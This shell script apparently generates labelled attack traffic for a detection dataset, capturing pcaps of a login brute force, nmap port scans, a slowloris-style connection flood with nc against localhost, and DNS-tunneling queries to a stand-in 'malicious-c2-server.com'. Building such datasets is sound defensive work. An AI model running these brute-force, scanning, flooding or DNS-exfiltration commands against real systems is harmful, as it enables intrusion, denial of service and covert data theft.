#!/bin/zsh

ATTACKS_DIR="data/raw/attacks"
ROUNDS=20

echo "🚀 Starting large dataset capture — $ROUNDS rounds each"

# ── BRUTE FORCE ─────────────────────────────────────────
echo "\n[1/4] BRUTE FORCE (2000 attempts x $ROUNDS rounds)"
for round in $(seq 1 $ROUNDS); do
  echo "  Round $round/$ROUNDS..."
  sudo tcpdump -i lo0 'port 8080' \
    -w ${ATTACKS_DIR}/bruteforce_r${round}.pcap \
    -s 0 --buffer-size=65536 &
  TCPDUMP_PID=$!
  sleep 3

  for i in $(seq 1 2000); do
    curl -s -X POST http://localhost:8080/login \
      -d "username=admin&password=pass${i}_r${round}" > /dev/null
    sleep 0.02
  done

  sleep 3
  sudo kill $TCPDUMP_PID 2>/dev/null
  wait $TCPDUMP_PID 2>/dev/null
  echo "  ✅ bruteforce_r${round}.pcap saved"
done

# ── PORT SCAN ────────────────────────────────────────────
echo "\n[2/4] PORT SCAN (full range x $ROUNDS rounds)"
for round in $(seq 1 $ROUNDS); do
  echo "  Round $round/$ROUNDS..."
  sudo tcpdump -i lo0 'port 8080 or portrange 1-9999' \
    -w ${ATTACKS_DIR}/portscan_r${round}.pcap \
    -s 0 --buffer-size=65536 &
  TCPDUMP_PID=$!
  sleep 3

  sudo nmap -sS localhost -p 1-9999
  nmap -sT localhost -p 1-9999
  nmap -A  localhost -p 1-9999
  nmap -F  localhost
  sudo nmap -sU localhost -p 1-1000

  sleep 3
  sudo kill $TCPDUMP_PID 2>/dev/null
  wait $TCPDUMP_PID 2>/dev/null
  echo "  ✅ portscan_r${round}.pcap saved"
done

# ── SLOW HTTP ────────────────────────────────────────────
echo "\n[3/4] SLOW HTTP (300 connections x $ROUNDS rounds)"
for round in $(seq 1 $ROUNDS); do
  echo "  Round $round/$ROUNDS..."
  sudo tcpdump -i lo0 'port 8080' \
    -w ${ATTACKS_DIR}/slowhttp_r${round}.pcap \
    -s 0 --buffer-size=65536 &
  TCPDUMP_PID=$!
  sleep 3

  for i in $(seq 1 300); do
    (echo -ne "GET / HTTP/1.1\r\nHost: localhost\r\n"; sleep 10) \
      | nc localhost 8080 &
  done

  sleep 15
  sudo kill $TCPDUMP_PID 2>/dev/null
  wait $TCPDUMP_PID 2>/dev/null
  killall nc 2>/dev/null
  echo "  ✅ slowhttp_r${round}.pcap saved"
done

# ── DNS TUNNELING ────────────────────────────────────────
echo "\n[4/4] DNS TUNNELING (2000 queries x $ROUNDS rounds)"
for round in $(seq 1 $ROUNDS); do
  echo "  Round $round/$ROUNDS..."
  sudo tcpdump -i en0 'port 53' \
    -w ${ATTACKS_DIR}/dnstunnel_r${round}.pcap \
    -s 0 --buffer-size=65536 &
  TCPDUMP_PID=$!
  sleep 3

  for i in $(seq 1 2000); do
    RANDOM_DATA=$(openssl rand -hex 16)
    nslookup ${RANDOM_DATA}.malicious-c2-server.com 8.8.8.8 > /dev/null 2>&1
    sleep 0.05
  done

  sleep 3
  sudo kill $TCPDUMP_PID 2>/dev/null
  wait $TCPDUMP_PID 2>/dev/null
  echo "  ✅ dnstunnel_r${round}.pcap saved"
done

echo "\n🎉 All captures done!"
echo "PCAP file count:"
ls ${ATTACKS_DIR}/*_r*.pcap | wc -l
echo "\nPCAP sizes:"
ls -lh ${ATTACKS_DIR}/*_r*.pcap
